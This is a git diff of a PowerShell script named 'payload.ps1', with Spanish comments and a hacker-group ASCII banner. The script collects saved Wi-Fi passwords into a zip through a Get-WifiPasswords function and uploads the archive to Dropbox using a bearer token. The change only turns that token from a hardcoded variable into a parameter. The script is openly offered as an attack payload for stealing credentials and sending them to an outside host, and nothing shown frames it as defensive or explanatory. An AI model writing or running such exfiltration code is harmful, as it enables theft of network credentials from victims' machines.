@@ -1,15 +1,17 @@
-# El token de acceso de Dropbox será proporcionado dinámicamente
-$db = ""  
+# payload.ps1
+param (
+    [string]$dropboxToken
+)
 
 function Show-Header {
     $header = @"
 ########################################################################################################################
-#    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____                           # 
-#   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                        # 
-#  | |     \ \_/ /| |_) | |__  | |__) | |__  | |      | | | |__) | |__) | |__  | |__) | (___                          # 
-#  | |      \   / |  _ <|  __| |  _  /|  __| | |      | | |  ___/|  ___/|  __| |  _  / \___ \                         # 
-#  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                        # 
-#   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/                          # 
+#    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____                           #
+#   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                         #
+#  | |     \ \_/ /| |_) | |__  | |__) | |__  | |      | | | |__) | |__) | |__  | |__) | (___                           #
+#  | |      \   / |  _ <|  __| |  _  /|  __| | |      | | |  ___/|  ___/|  __| |  _  / \___ \                          #
+#  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                         #
+#   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/                          #
  #########################################################################################################################           
 "@
     return $header
@@ -25,7 +27,7 @@ function DropBox-Upload {
     $outputFile = Split-Path $SourceFilePath -leaf
     $TargetFilePath = "/$outputFile"
     $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-    $authorization = "Bearer " + $db
+    $authorization = "Bearer " + $dropboxToken
     $headers = @{
         "Authorization" = $authorization
         "Dropbox-API-Arg" = $arg
@@ -69,7 +71,7 @@ try {
     $zipFilePath = Get-WifiPasswords
 
     # Subir a Dropbox si se proporciona el token
-    if (-not ([string]::IsNullOrEmpty($db))) {
+    if (-not ([string]::IsNullOrEmpty($dropboxToken))) {
         DropBox-Upload -f $zipFilePath
     } else {
         Write-Error "No se proporcionó el token de acceso de Dropbox."
